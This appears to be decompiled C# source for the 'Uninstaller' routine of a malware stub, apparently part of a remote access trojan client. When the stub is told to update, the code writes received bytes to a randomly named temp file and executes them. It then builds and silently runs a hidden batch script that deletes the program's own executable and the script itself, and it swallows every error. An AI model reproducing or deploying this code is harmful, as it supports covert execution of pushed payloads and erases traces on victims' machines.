using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Stub;

public class Uninstaller
{
	public static void UNS(bool IsUpdate, string Str, byte[] B)
	{
		if (IsUpdate)
		{
			try
			{
				Str = Path.Combine(Path.GetTempPath(), Helper.GetRandomString(6) + Str);
				File.WriteAllBytes(Str, B);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			string text = Path.GetTempFileName() + ".bat";
			using (StreamWriter streamWriter = new StreamWriter(text))
			{
				streamWriter.WriteLine("@echo off");
				streamWriter.WriteLine("timeout 3 > NUL");
				streamWriter.WriteLine("CD " + Application.get_StartupPath());
				streamWriter.WriteLine("DEL \"" + Path.GetFileName(Application.get_ExecutablePath()) + "\" /f /q");
				streamWriter.WriteLine("CD " + Path.GetTempPath());
				streamWriter.WriteLine("DEL \"" + Path.GetFileName(text) + "\" /f /q");
			}
			if (IsUpdate)
			{
				try
				{
					Process.Start(Str);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = text;
			processStartInfo.CreateNoWindow = true;
			processStartInfo.ErrorDialog = false;
			processStartInfo.UseShellExecute = false;
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			Process.Start(processStartInfo);
			Environment.Exit(0);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}
}
